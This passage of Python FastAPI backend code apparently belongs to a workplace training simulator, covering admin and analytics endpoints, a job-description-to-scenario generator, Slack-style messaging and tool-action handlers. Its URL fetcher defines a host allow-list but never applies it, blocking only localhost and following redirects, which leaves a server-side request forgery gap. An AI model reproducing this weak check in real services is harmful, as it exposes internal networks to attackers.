        "PLATFORM": "Where the campaign runs — LinkedIn, Twitter, Email, Google Ads, etc.",
        "BUDGET": "Total budget cap for this campaign.",
        "SPEND": "How much has been spent so far. If spend > budget → STOP and escalate.",
        "CTR": "Click-through rate — clicks ÷ impressions. Above 2% is generally good.",
        "ROAS": "Return on ad spend — revenue ÷ spend. Above 3.0× usually means the campaign is profitable.",
        "CPA": "Cost per acquisition — spend ÷ conversions. Lower is better.",
    },
    "calendar": {
        "DATE": "When this asset is scheduled to publish.",
        "CHANNEL": "Where it goes out — LinkedIn, Email, On-site, etc.",
        "ASSIGNEE": "Owner of the asset. 'you' = your responsibility.",
        "STATUS": "draft → awaiting_review → scheduled → published. Flagged means blocked.",
    },
    "invoices": {
        "AMOUNT": "What the invoice charges the client.",
        "PO_AMOUNT": "What the original purchase order authorised. If amounts differ → query before paying.",
        "STATUS": "queried = mismatch / dispute. paid = settled. open = awaiting your action.",
        "CLIENT": "The customer being invoiced.",
    },
    "dashboard": {
        "IMPRESSIONS": "How many people saw the content (rough reach number).",
        "CLICKS": "How many people interacted with the content.",
        "CONVERSIONS": "How many took the goal action (signup, purchase, demo booking).",
    },
}

@app.get("/api/tooltips")
async def api_tooltips(tool_type: str = ""):
    """Return per-tool-type column tooltips. The frontend renders these
    only when session.experience_level == 'beginner'."""
    if tool_type:
        return {"tool_type": tool_type, "tooltips": _TOOL_TOOLTIPS.get(tool_type, {})}
    return {"tooltips_by_type": _TOOL_TOOLTIPS}

@app.get("/api/reputation")
async def api_reputation():
    r = reputation_col.find_one({"session_id": session_id()}, {"_id": 0, "events": 0}) or {}
    if not r:
        return {"status": "good_standing"}
    return r

# ── ADAPTIVE SCENARIO ENGINE — admin + slack + multi-tool endpoints ──

ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")

class IngestReq(BaseModel):
    career: str = Field(..., pattern=r"^(accountant|cybersecurity|marketing|developer|procurement|hr|pm)$")
    source: Optional[str] = Field(None, pattern=r"^(seed_file|adzuna)$")
    limit: int = Field(5, ge=1, le=20)

@app.post("/api/admin/ingest")
async def api_admin_ingest(req: IngestReq, x_admin_token: Optional[str] = Header(None)):
    """Pull JDs from the configured sources and extract scenarios. Admin-only.

    Set ADMIN_TOKEN in .env and pass it via X-Admin-Token header. Without an
    admin token configured, the endpoint refuses all calls."""
    if not ADMIN_TOKEN:
        raise HTTPException(503, "Ingestion disabled — set ADMIN_TOKEN in .env first.")
    if not x_admin_token or not hmac.compare_digest(x_admin_token, ADMIN_TOKEN):
        raise HTTPException(401, "Invalid admin token.")
    engine = get_scenario_engine()
    result = engine.ingest(career=req.career, source_name=req.source, limit=req.limit)
    log.info("admin.ingest career=%s source=%s result=%s", req.career, req.source, result)
    return result

@app.get("/api/admin/scenarios")
async def api_admin_scenarios(x_admin_token: Optional[str] = Header(None)):
    """List cached scenario templates. Admin-only."""
    if not ADMIN_TOKEN or not x_admin_token or not hmac.compare_digest(x_admin_token, ADMIN_TOKEN):
        raise HTTPException(401, "Invalid admin token.")
    rows = list(scenarios_col.find({}, {"_id": 0, "emails": 0}).limit(100))
    return {"count": len(rows), "scenarios": rows}

# ── ANALYTICS ─────────────────────────────────────────────────────
def track(event: str, user_id_val: Optional[str] = None, data: Optional[dict] = None) -> None:
    """Fire-and-forget event log. Never raises — analytics must not break user flow."""
    try:
        analytics_col.insert_one({
            "event": event,
            "user_id": user_id_val or user_id(),
            "data": data or {},
            "ts": datetime.utcnow().isoformat(),
        })
    except Exception as ex:
        log.warning("analytics.track_failed event=%s kind=%s", event, type(ex).__name__)

@app.get("/api/admin/analytics")
async def api_admin_analytics(x_admin_token: Optional[str] = Header(None), days: int = 7):
    """Event counts for the last N days. Admin-only."""
    if not ADMIN_TOKEN or not x_admin_token or not hmac.compare_digest(x_admin_token, ADMIN_TOKEN):
        raise HTTPException(401, "Invalid admin token.")
    days = max(1, min(days, 90))
    since = (datetime.utcnow() - timedelta(days=days)).isoformat()
    pipeline = [
        {"$match": {"ts": {"$gte": since}}},
        {"$group": {"_id": "$event", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
    ]
    rows = list(analytics_col.aggregate(pipeline))
    return {"window_days": days, "events": {r["_id"]: r["count"] for r in rows},
            "total": sum(r["count"] for r in rows)}

# ── USER-FACING JD INPUT ─────────────────────────────────────────
# Anyone signed in can paste a job description (URL or raw text) and get a
# tailored simulation generated for them. Per-user rate-limited because it
# fires an LLM extraction call.

import httpx as _httpx
_JD_URL_ALLOWED_HOSTS = (
    "boards.greenhouse.io", "jobs.lever.co", "jobs.workable.com",
    "ashbyhq.com", "apply.workable.com",
    "indeed.com", "uk.indeed.com", "linkedin.com", "uk.linkedin.com",
    "reed.co.uk", "totaljobs.com", "wellfound.com",
    "jobs.smartrecruiters.com", "boards.eu.greenhouse.io",
)
_jd_rate: "dict[str, float]" = {}
_JD_RATE_SEC = 30.0

def _strip_html_to_text(html: str) -> str:
    # Drop scripts/styles/nav, then collapse tags. Keep paragraph breaks.
    h = re.sub(r"(?is)<(script|style|noscript|svg)[^>]*>.*?</\1>", " ", html)
    h = re.sub(r"(?is)</(p|div|li|h[1-6]|br|tr)\s*>", "\n", h)
    h = re.sub(r"(?s)<[^>]+>", " ", h)
    h = re.sub(r"&nbsp;", " ", h)
    h = re.sub(r"&amp;", "&", h)
    h = re.sub(r"&lt;", "<", h)
    h = re.sub(r"&gt;", ">", h)
    h = re.sub(r"&quot;", '"', h)
    h = re.sub(r"&#39;", "'", h)
    h = re.sub(r"[ \t\r\f\v]+", " ", h)
    h = re.sub(r"\n{3,}", "\n\n", h)
    return h.strip()

def _fetch_jd_from_url(url: str) -> tuple[str, str]:
    """Best-effort JD fetch. Returns (title, text) or raises HTTPException."""
    try:
        from urllib.parse import urlparse
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        raise HTTPException(400, "Invalid URL.")
    if not host:
        raise HTTPException(400, "Invalid URL.")
    # Soft allow-list — refuse obvious internal/private hosts.
    if host in ("localhost", "127.0.0.1") or host.endswith(".local"):
        raise HTTPException(400, "URL host not allowed.")
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; FirstDeskBot/0.1; +https://firstdesk.app)",
        "Accept": "text/html,application/xhtml+xml",
    }
    try:
        r = _httpx.get(url, headers=headers, timeout=8.0, follow_redirects=True)
        if r.status_code >= 400:
            raise HTTPException(422, f"Couldn't fetch the page (HTTP {r.status_code}). LinkedIn often blocks bots — paste the description text instead.")
        html = r.text
    except _httpx.HTTPError as ex:
        log.warning("jd_fetch.failed url=%s kind=%s", url[:120], type(ex).__name__)
        raise HTTPException(422, "Couldn't reach that page. Paste the description text instead.")
    title_m = re.search(r"(?is)<title[^>]*>(.*?)</title>", html)
    title = _strip_html_to_text(title_m.group(1)) if title_m else "Pasted Job"
    text = _strip_html_to_text(html)
    if len(text) < 200:
        raise HTTPException(422, "The page didn't contain enough readable text. Paste the description directly.")
    return title[:200], text[:8000]

_CAREER_CLASSIFIER_PROMPT = (
    "You classify a job description into ONE of seven workplace simulator careers. "
    "Pick the SINGLE closest fit. Reply with ONE word only.\n"
    "- accountant: finance, accounting, AP/AR, bookkeeping, audit, controller, FP&A, treasury, payroll\n"
    "- cybersecurity: SOC analyst, security engineer, infosec, threat detection, incident response, GRC, SIEM\n"
    "- marketing: marketing, growth, content, SEO, brand, social, demand gen, comms, PR, copywriter, sales/SDR/BDR/AE/CSM (closest match for sales roles)\n"
    "- developer: software engineer, backend, frontend, full-stack, mobile, devops, SRE, data engineer, ML engineer, QA\n"
    "- procurement: procurement, sourcing, vendor management, supply chain, purchasing, contracts, operations/ops (closest match)\n"
    "- hr: HR, people, L&D, talent, recruiting, training, organisational development, employee relations\n"
    "- pm: product manager, product owner, UX designer, product designer, researcher, business analyst, data analyst (closest match)\n"
    "If unclear, default to the closest functional fit. Reply with EXACTLY one word from this list."
)
_VALID_CAREERS = {"accountant", "cybersecurity", "marketing", "developer", "procurement", "hr", "pm"}

def _classify_career_from_jd(jd_text: str, title: str = "") -> str:
    """Pick the closest of the 7 careers for a free-form JD. Falls back to 'pm' on failure."""
    snippet = (title + "\n\n" + (jd_text or ""))[:3000].strip()
    if not snippet:
        return "pm"
    try:
        resp = llm.invoke([("system", _CAREER_CLASSIFIER_PROMPT), ("human", snippet)])
        choice = (getattr(resp, "content", "") or "").strip().lower().split()[0] if resp else ""
        choice = choice.strip(".,:;()\"'")
        if choice in _VALID_CAREERS:
            log.info("jd.career_classified=%s title=%r", choice, title[:60])
            return choice
    except Exception as ex:
        log.warning("jd.classify_failed kind=%s", type(ex).__name__)
    return "pm"

class JDIngestReq(BaseModel):
    career: str = Field("auto", pattern=r"^(auto|accountant|cybersecurity|marketing|developer|procurement|hr|pm)$")
    experience_level: str = Field("experienced", pattern=r"^(experienced|studied|beginner)$")
    url: Optional[str] = Field(None, max_length=2000)
    text: Optional[str] = Field(None, max_length=20000)
    title: Optional[str] = Field(None, max_length=200)
    company: Optional[str] = Field(None, max_length=120)

@app.post("/api/scenario/from-jd")
async def api_scenario_from_jd(req: JDIngestReq, request: Request):
    """User pastes a job URL or full description → engine extracts → materialises into THIS user's sim, replacing whatever's there."""
    user = request.state.user
    uid = user["user_id"]

    now = time.time()
    last = _jd_rate.get(uid, 0.0)
    if now - last < _JD_RATE_SEC:
        wait = int(_JD_RATE_SEC - (now - last))
        raise HTTPException(429, f"Please wait {wait}s before generating another scenario.")
    _jd_rate[uid] = now

    if not req.url and not (req.text and req.text.strip()):
        raise HTTPException(400, "Provide either a URL or the job description text.")

    if req.text and req.text.strip():
        jd_text = req.text.strip()[:8000]
        jd_title = (req.title or "Pasted Job Description").strip()[:200]
    else:
        jd_title, jd_text = _fetch_jd_from_url(req.url.strip())
        if req.title:
            jd_title = req.title.strip()[:200]
    company = (req.company or "Custom Scenario Co").strip()[:120] or "Custom Scenario Co"

    # Auto-classify career if the user picked "Auto-detect" (or any role outside our 7 fixed tracks)
    resolved_career = req.career
    if resolved_career == "auto":
        resolved_career = _classify_career_from_jd(jd_text, jd_title)

    # Build a JobPosting and run it through the extractor + materializer directly.
    from scenario_engine import JobPosting as _JP
    job = _JP(
        ext_id=f"user:{uid}:{int(now)}",
        career=resolved_career,
        title=jd_title,
        company=company,
        description=jd_text,
        location="",
        seniority="junior",
        source="user_paste",
        tools_mentioned=[],
        raw={"submitted_by": uid},
    )

    engine = get_scenario_engine()
    template = engine.extractor.extract(job)
    if template is None:
        raise HTTPException(422, "Couldn't extract a workable scenario from that JD. Try a more detailed description.")

    # Persist for reuse + cache the JD
    jobs_col.update_one(
        {"ext_id": job.ext_id},
        {"$set": {**__import__('dataclasses').asdict(job),
                  "cached_at": datetime.utcnow().isoformat()}},
        upsert=True,
    )
    if not scenarios_col.find_one({"fingerprint": template.fingerprint}, {"_id": 1}):
        scenarios_col.insert_one({
            "scenario_id": template.scenario_id,
            "career": template.career,
            "title": template.title,
            "company": template.company,
            "fingerprint": template.fingerprint,
            "source_job_ext_id": template.source_job_ext_id,
            "emails": template.emails,
            "tasks": template.tasks,
            "tool_data": template.tool_data,
            "system_events": template.system_events,
            "tools": template.tools,
            "created_at": template.created_at,
            "submitted_by": uid,
        })

    # Reset this user's sim state and materialise the new scenario into it
    _career_var.set(resolved_career)
    reset_chat_history()
    clear_sim()
    cfg = CAREER_CONFIGS[resolved_career]
    summary = engine.materializer.materialise(template, sim_id())
    engine.mark_seen(uid, template.scenario_id, resolved_career)

    _tag_day1_artifacts()
    init_session(resolved_career, req.experience_level)
    init_reputation()
    set_orchestrator(create_orchestrator(resolved_career, req.experience_level))
    progress_col.update_one(
        {"user_id": uid},
        {"$set": {"current_career": resolved_career, "current_day": 1,
                  "started_career_at": datetime.utcnow().isoformat()}},
        upsert=True,
    )
    log.info("scenario.from_jd user=%s career=%s scenario=%s tasks=%d emails=%d",
             uid, resolved_career, template.scenario_id, summary["tasks"], summary["emails"])
    return {
        "status": "started",
        "career": resolved_career,
        "career_auto_detected": req.career == "auto",
        "title": cfg["title"],
        "company": summary.get("company", cfg["company"]),
        "tools": list(summary.get("tools_palette") or cfg["tools"]),
        "scenario": summary,
        "source": "user_paste",
    }

# ── SLACK (multi-tool comms) ─────────────────────────────────────
# Slack is now a real backed tool. Multi-tool task workflows broadcast their
# progress here, and the user can read/post messages from the simulator UI.

class SlackPostReq(BaseModel):
    channel: str = Field(..., min_length=2, max_length=40)
    text: SafeStr = Field(..., min_length=1, max_length=2000)

@app.get("/api/slack")
async def api_slack_list_channels():
    sm = sim_id()
    chs = slack_col.distinct("channel", {"simulation_id": sm})
    return {"channels": sorted(chs)}

@app.get("/api/slack/{channel}")
async def api_slack_channel(channel: str):
    if not channel.startswith("#"):
        channel = "#" + channel
    msgs = list(slack_col.find({"simulation_id": sim_id(), "channel": channel}, {"_id": 0}).sort("ts", 1))
    return {"channel": channel, "messages": msgs}

@app.post("/api/slack/post")
async def api_slack_post(req: SlackPostReq):
    ch = req.channel if req.channel.startswith("#") else "#" + req.channel
    row = {
        "id": f"sl_{uuid.uuid4().hex[:8]}",
        "simulation_id": sim_id(),
        "channel": ch,
        "author": "you",
        "text": req.text,
        "ts": datetime.utcnow().isoformat(),
    }
    slack_col.insert_one(row)
    actions_col.insert_one({
        "simulation_id": sim_id(),
        "action": f"slack:{ch}:{req.text[:200]}",
        "ts": datetime.utcnow().isoformat(),
    })
    # Tone observer applies to Slack posts too
    observe_tone(req.text)
    check_escalations()
    emit("slack_posted", {"channel": ch, "text": req.text})
    return {"ok": True, "message": {k: v for k, v in row.items() if k != "_id"}}

def _post_slack_system(channel: str, author: str, text: str) -> None:
    """Internal helper for cross-tool event handlers to broadcast in Slack."""
    if not channel.startswith("#"):
        channel = "#" + channel
    slack_col.insert_one({
        "id": f"sl_{uuid.uuid4().hex[:8]}",
        "simulation_id": sim_id(),
        "channel": channel,
        "author": author,
        "text": text[:600],
        "ts": datetime.utcnow().isoformat(),
        "system": True,
    })

# ══════════════════════════════════════════
# GENERIC TOOL SURFACE — table / sql / kanban / dashboard / alerts /
#                       editor / terminal / crm
# ══════════════════════════════════════════
# Each scenario can populate `tools_col` with 2–5 tool documents. The
# desktop renders a dynamic icon + window for every one of them. Writes
# go through `dispatch_action`, which validates against per-type rules,
# awards points, flags mistakes via manager email, and broadcasts a
# summary to Slack so the rest of the simulator sees the change.

# Channels we mirror tool actions to (bots, not the user). Falls back to
# the career's primary channel when the type-specific one isn't present.
_TOOL_BOT_CHANNEL: dict[str, str] = {
    "table":     "#finance",
    "sql":       "#data",
    "kanban":    "#engineering",
    "dashboard": "#analytics",
    "alerts":    "#soc-alerts",
    "editor":    "#engineering",
    "terminal":  "#incidents",
    "crm":       "#sales",
}

_TOOL_BOT_NAME: dict[str, str] = {
    "table":     "Sheets Bot",
    "sql":       "Query Bot",
    "kanban":    "Board Bot",
    "dashboard": "Analytics Bot",
    "alerts":    "SIEM Bot",
    "editor":    "Code Review Bot",
    "terminal":  "Shell Bot",
    "crm":       "CRM Bot",
}


def _tool_summary(t: dict) -> dict:
    """Compact list-row payload for /api/tools."""
    d = t.get("data") or {}
    progress = _tool_progress(t)
    return {
        "tool_id":   t["tool_id"],
        "name":      t.get("name") or t.get("tool_type", "Tool").title(),
        "tool_type": t.get("tool_type"),
        "icon":      t.get("icon") or TOOL_DEFAULT_ICON.get(t.get("tool_type"), "tool"),
        "tint":      t.get("tint") or TOOL_DEFAULT_TINT.get(t.get("tool_type"), "#475569"),
        "category":  t.get("category", "generic"),
        "progress":  progress,
        "summary":   _tool_short_summary(t),
    }


def _tool_short_summary(t: dict) -> str:
    """One-line teaser for the icon hover tooltip."""
    tt = t.get("tool_type")
    d = t.get("data") or {}
    if tt == "table":
        return f"{len(d.get('rows', []))} rows · {len(d.get('columns', []))} cols"
    if tt == "sql":
        n = len(d.get("schema", []))
        ch = sum(1 for c in d.get("challenges", []) if not c.get("done"))
        return f"{n} table{'s' if n != 1 else ''} · {ch} open challenge{'s' if ch != 1 else ''}"
    if tt == "kanban":
        n = len(d.get("cards", []))
        return f"{n} card{'s' if n != 1 else ''} across {len(d.get('columns', []))} columns"
    if tt == "dashboard":
        return f"{len(d.get('metrics', []))} metrics · {sum(1 for q in d.get('questions', []) if not q.get('done'))} open Q"
    if tt == "alerts":
        op = sum(1 for a in d.get("alerts", []) if a.get("status") == "open")
        return f"{op} open alert{'s' if op != 1 else ''}"
    if tt == "editor":
        return f"{d.get('language','code')} · {len(d.get('files', []))} file{'s' if len(d.get('files', [])) != 1 else ''}"
    if tt == "terminal":
        return d.get("challenge", "shell challenge")[:80]
    if tt == "crm":
        return f"{len(d.get('contacts', []))} contacts in {len(d.get('stages', []))} stages"
    return ""


def _tool_progress(t: dict) -> dict:
    """Closed/total counters, used by the desktop badge."""
    d = t.get("data") or {}
    tt = t.get("tool_type")
    if tt == "table":
        ec = d.get("expected_corrections") or []
        return {"done": sum(1 for c in ec if c.get("done")), "total": len(ec)}
    if tt == "sql":
        ch = d.get("challenges") or []
        return {"done": sum(1 for c in ch if c.get("done")), "total": len(ch)}
    if tt == "kanban":
        cards = d.get("cards") or []
        graded = [c for c in cards if c.get("expected_column")]
        return {"done": sum(1 for c in graded if c.get("column") == c.get("expected_column")),
                "total": len(graded)}
    if tt == "dashboard":
        qs = d.get("questions") or []
        return {"done": sum(1 for q in qs if q.get("done")), "total": len(qs)}
    if tt == "alerts":
        al = d.get("alerts") or []
        return {"done": sum(1 for a in al if a.get("status") and a.get("status") != "open"),
                "total": len(al)}
    if tt in ("editor", "terminal"):
        return {"done": 1 if d.get("solved") else 0, "total": 1}
    if tt == "crm":
        cs = [c for c in (d.get("contacts") or []) if c.get("expected_stage")]
        return {"done": sum(1 for c in cs if c.get("stage") == c.get("expected_stage")),
                "total": len(cs)}
    return {"done": 0, "total": 0}


@app.get("/api/tools")
async def api_tools_list():
    """List every tool the active scenario surfaces on the desktop."""
    rows = list(tools_col.find({"simulation_id": sim_id()}, {"_id": 0, "actions_log": 0}))
    return {"tools": [_tool_summary(t) for t in rows]}


@app.get("/api/tool/{tool_id}")
async def api_tool_get(tool_id: str):
    t = tools_col.find_one({"tool_id": tool_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t:
        raise HTTPException(404, "Tool not found")
    return {"tool": t}


class ToolActionReq(BaseModel):
    action: str = Field(..., min_length=1, max_length=40)
    params: dict[str, Any] = Field(default_factory=dict)
    # Workplace-physics extension (optional; backward compatible).
    # Frontend passes `action_key` (e.g. "siem.escalate_alert_correct") +
    # `context` (template variables for the rule's email/slack bodies).
    action_key: Optional[str] = Field(None, pattern=r"^[a-z_]+\.[a-z_]+$", max_length=64)
    context: dict[str, Any] = Field(default_factory=dict)


@app.post("/api/tool/{tool_id}/action")
async def api_tool_action(tool_id: str, req: ToolActionReq):
    """Validated write into a generic tool. Awards/penalises points,
    flags mistakes via manager email, broadcasts to Slack, fires events."""
    t = tools_col.find_one({"tool_id": tool_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t:
        raise HTTPException(404, "Tool not found")

    result = tool_dispatch_action(t, req.action, req.params)
    res = result.to_dict()

    # Persist mutation regardless of whether it earned points — the user's
    # work-in-progress should survive page reloads even on neutral edits.
    log_entry = {
        "ts": datetime.utcnow().isoformat(),
        "action": req.action,
        "params": req.params,
        "ok": res["ok"],
        "points_delta": res.get("points_delta", 0),
        "message": res.get("message", "")[:240],
    }
    tools_col.update_one(
        {"tool_id": tool_id, "simulation_id": sim_id()},
        {"$set": {"data": t["data"]}, "$push": {"actions_log": {"$each": [log_entry], "$slice": -80}}},
    )

    # Score side-effects ride on the same session-score pipeline used by
    # tasks, so end-of-day picks them up.
    pts = int(res.get("points_delta") or 0)
    if pts:
        sessions_col.update_one({"session_id": session_id()}, {"$inc": {"score_adj": pts}})
        actions_col.insert_one({
            "simulation_id": sim_id(),
            "action": f"tool:{t.get('tool_type','?')}:{req.action}:{pts:+d}",
            "ts": datetime.utcnow().isoformat(),
        })

    # Manager feedback materialises as an email so it shows up in Outlook.
    fb = res.get("manager_feedback")
    if fb:
        cfg = CAREER_CONFIGS.get(get_career() or "accountant", CAREER_CONFIGS["accountant"])
        _push_email(
            cfg["manager"],
            f"Re: your edit in {t.get('name','a tool')}",
            fb,
            priority="medium",
            category="tool_feedback",
        )

    # Slack broadcast — tool acts like a real workplace tool that pages teammates.
    slack_summary = res.get("slack_summary")
    if slack_summary:
        bot_name = _TOOL_BOT_NAME.get(t.get("tool_type"), "Tools Bot")
        career_chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
        ch = _TOOL_BOT_CHANNEL.get(t.get("tool_type"))
        if not ch or not slack_col.count_documents({"simulation_id": sim_id(), "channel": ch}, limit=1):
            ch = career_chans[0]
        _post_slack_system(ch, bot_name, slack_summary)

    # Cross-tool event bus relay (alerts → Jira ticket, etc.).
    for name, payload in (res.get("events") or []):
        emit(name, dict(payload))

    # ── Workplace physics: cross-tool causality cascade ──
    # The engine runs additively on top of the existing pipeline; if the
    # frontend didn't send an action_key, the cascade is a no-op.
    physics_effects: list[dict] = []
    if req.action_key:
        try:
            sess = sessions_col.find_one({"session_id": session_id()}, {"_id": 0}) or {}
            cfg = CAREER_CONFIGS.get(get_career() or "accountant", CAREER_CONFIGS["accountant"])
            engine = WorkplacePhysicsEngine(
                emails_col=emails_col, tasks_col=tasks_col, tools_col=tools_col,
                slack_col=slack_col, evals_col=evals_col, jira_col=jira_col,
                sessions_col=sessions_col,
                career_config=cfg,
                sim_id=sim_id(), session_id=session_id(),
                user_id=sess.get("user_id") or "anon",
                user_name=(sess.get("user_name") or sess.get("name") or "you"),
            )
            physics_effects = engine.process(req.action_key, dict(req.context or {}))
        except Exception as ex:
            log.warning("workplace_physics.fail key=%s err=%s", req.action_key, ex)

    return {
        "ok": res["ok"],
        "result": res,
        "tool": tools_col.find_one({"tool_id": tool_id, "simulation_id": sim_id()}, {"_id": 0}),
        "effects": physics_effects,
        "effects_count": len(physics_effects),
    }


class PhysicsFireReq(BaseModel):
    action_key: str = Field(..., pattern=r"^[a-z_]+\.[a-z_]+$", max_length=64)
    context: dict[str, Any] = Field(default_factory=dict)


@app.post("/api/physics/fire")
async def api_physics_fire(req: PhysicsFireReq):
    """Fire a workplace-physics rule directly (no tool action involved).
    Used by frontend buttons that aren't tool-scoped (email replies, task
    completions, IT outage reports, etc.)."""
    if req.action_key not in WORKPLACE_PHYSICS:
        raise HTTPException(404, "Unknown physics rule")
    sess = sessions_col.find_one({"session_id": session_id()}, {"_id": 0}) or {}
    cfg = CAREER_CONFIGS.get(get_career() or "accountant", CAREER_CONFIGS["accountant"])
    engine = WorkplacePhysicsEngine(
        emails_col=emails_col, tasks_col=tasks_col, tools_col=tools_col,
        slack_col=slack_col, evals_col=evals_col, jira_col=jira_col,
        sessions_col=sessions_col,
        career_config=cfg,
        sim_id=sim_id(), session_id=session_id(),
        user_id=sess.get("user_id") or "anon",
        user_name=(sess.get("user_name") or sess.get("name") or "you"),
    )
    effects = engine.process(req.action_key, dict(req.context or {}))
    return {"effects": effects, "effects_count": len(effects)}


@app.get("/api/score/physics")
async def api_physics_score():
    """Aggregate the running physics-driven score for the current sim,
    plus a recent-history feed of physics notes for the EOD review."""
    _sim = sim_id()
    pipeline = [
        {"$match": {"simulation_id": _sim, "source": "workplace_physics"}},
        {"$group": {
            "_id": None,
            "total": {"$sum": "$points"},
            "positive": {"$sum": {"$cond": [{"$gt": ["$points", 0]}, "$points", 0]}},
            "negative": {"$sum": {"$cond": [{"$lt": ["$points", 0]}, "$points", 0]}},
            "n": {"$sum": 1},
        }},
    ]
    agg = next(iter(evals_col.aggregate(pipeline)), None) or {}
    notes = list(evals_col.find(
        {"simulation_id": _sim, "source": "workplace_physics"},
        {"_id": 0, "note": 1, "points": 1, "ts": 1},
    ).sort("ts", -1).limit(50))
    return {
        "physics_score": int(agg.get("total", 0) or 0),
        "positive_points": int(agg.get("positive", 0) or 0),
        "negative_points": int(agg.get("negative", 0) or 0),
        "events_count": int(agg.get("n", 0) or 0),
        "notes": notes,
    }


# ── LangChain wrappers so the orchestrator agent can read & write tools ──

@tool
def get_tool_list() -> str:
    """List every interactive tool on the user's desktop (id, type, name, progress)."""
    rows = list(tools_col.find({"simulation_id": sim_id()}, {"_id": 0, "actions_log": 0}))
    if not rows:
        return "No generic tools materialised for this scenario."
    return "\n".join(
        f"{r['tool_id']} | {r.get('tool_type','?'):<9} | {r.get('name','?')} | {_tool_short_summary(r)}"
        for r in rows
    )


@tool
def get_tool_content(tool_id: str) -> str:
    """Return the full data for a tool by id (table rows, SQL schema, kanban cards, etc.)."""
    t = tools_col.find_one({"tool_id": tool_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t:
        return f"Tool {tool_id} not found."
    return json.dumps({
        "tool_id":   t["tool_id"],
        "name":      t.get("name"),
        "tool_type": t.get("tool_type"),
        "data":      t.get("data"),
    }, default=str)[:6000]


@tool
def update_tool(tool_id: str, action: str, params_json: str) -> str:
    """Apply a write action to a tool. Validated server-side. params_json is a JSON object string.
Examples:
  table.update_cell  → params_json='{"row":0,"column":"Debit","value":1850}'
  sql.run_query      → params_json='{"query":"SELECT * FROM orders WHERE status='\\'refunded\\''"}'
  kanban.move_card   → params_json='{"card_id":"BUG-301","to_column":"Review"}'
  alerts.triage      → params_json='{"alert_id":"A1","action":"escalate"}'
  editor.submit_code → params_json='{"file":"main.py","content":"..."}'
  terminal.run_command→ params_json='{"command":"kubectl rollout restart deploy/api"}'
  dashboard.answer_question → params_json='{"question_id":"q1","answer":42}'
  crm.advance_stage  → params_json='{"contact_id":"cn_1","stage":"Proposal"}'"""
    try:
        params = json.loads(params_json) if params_json else {}
    except Exception as ex:
        return f"params_json must be a JSON object: {ex}"
    t = tools_col.find_one({"tool_id": tool_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t:
        return f"Tool {tool_id} not found."
    result = tool_dispatch_action(t, action, params)
    res = result.to_dict()
    # Reuse the HTTP path's persistence + side-effects by replaying the
    # work inline. Keep it short — the agent doesn't need the long form.
    log_entry = {
        "ts": datetime.utcnow().isoformat(),
        "action": action, "params": params,
        "ok": res["ok"], "points_delta": res.get("points_delta", 0),
        "message": res.get("message", "")[:240],
    }
    tools_col.update_one(
        {"tool_id": tool_id, "simulation_id": sim_id()},
        {"$set": {"data": t["data"]}, "$push": {"actions_log": {"$each": [log_entry], "$slice": -80}}},
    )
    pts = int(res.get("points_delta") or 0)
    if pts:
        sessions_col.update_one({"session_id": session_id()}, {"$inc": {"score_adj": pts}})
    fb = res.get("manager_feedback")
    if fb:
        cfg = CAREER_CONFIGS.get(get_career() or "accountant", CAREER_CONFIGS["accountant"])
        _push_email(cfg["manager"], f"Re: your edit in {t.get('name','a tool')}", fb,
                    priority="medium", category="tool_feedback")
    if res.get("slack_summary"):
        bot_name = _TOOL_BOT_NAME.get(t.get("tool_type"), "Tools Bot")
        career_chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
        ch = _TOOL_BOT_CHANNEL.get(t.get("tool_type"))
        if not ch or not slack_col.count_documents({"simulation_id": sim_id(), "channel": ch}, limit=1):
            ch = career_chans[0]
        _post_slack_system(ch, bot_name, res["slack_summary"])
    for name, payload in (res.get("events") or []):
        emit(name, dict(payload))
    return f"{'OK' if res['ok'] else 'ERR'}{f' ({pts:+d}pts)' if pts else ''}: {res.get('message','')}"


# Cross-tool reactions: an escalated alert auto-creates a Jira ticket; a
# correctly-edited table row pings the team in #finance; a solved SQL
# challenge nudges the dashboard. These mirror the existing event-bus
# pattern so every tool feels alive.

@on_event("tool_alert_triaged")
def _alert_tool_to_jira(p: dict):
    if not p.get("correct"):
        return
    if p.get("action") != "escalate":
        return
    alert = p.get("alert") or {}
    cfg = CAREER_CONFIGS.get(get_career())
    if not cfg:
        return
    tid = f"INC-{uuid.uuid4().hex[:4].upper()}"
    jira_col.insert_one({
        "id": tid, "simulation_id": sim_id(),
        "type": "incident",
        "title": f"[Triage→INC] {alert.get('title','Alert')}",
        "priority": alert.get("severity", "MEDIUM"),
        "status": "open",
        "assignee": cfg["teammate"]["name"],
        "reporter": "you",
        "source_alert": alert.get("id"),
        "description": alert.get("details", ""),
        "component": "incident-response",
    })
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    primary = "#incidents" if "#incidents" in chans else chans[0]
    _post_slack_system(primary, "Jira Bot",
                       f"Auto-created {tid} from alert {alert.get('id','?')} — assigned to {cfg['teammate']['name']}.")


@on_event("tool_kanban_moved")
def _kanban_to_ci(p: dict):
    if not p.get("is_correct"):
        return
    if (p.get("to") or "").lower() in ("review", "in review"):
        chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
        ch = "#engineering" if "#engineering" in chans else chans[0]
        _post_slack_system(ch, "CI Bot",
                           f"PR for {p.get('card_id','card')} ({p.get('title','')[:60]}) — pipeline running, reviewer auto-assigned.")


@on_event("tool_sql_solved")
def _sql_to_dashboard(p: dict):
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    ch = "#analytics" if "#analytics" in chans else chans[0]
    _post_slack_system(ch, "Analytics Bot",
                       f"Query {p.get('challenge_id','?')} merged into the live dashboard ({p.get('rows','?')} rows).")


@on_event("tool_terminal_solved")
def _terminal_to_incidents(p: dict):
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    ch = "#incidents" if "#incidents" in chans else chans[0]
    _post_slack_system(ch, "Ops Bot", "Shell challenge resolved — service back to green.")


@on_event("tool_editor_solved")
def _editor_to_eng(p: dict):
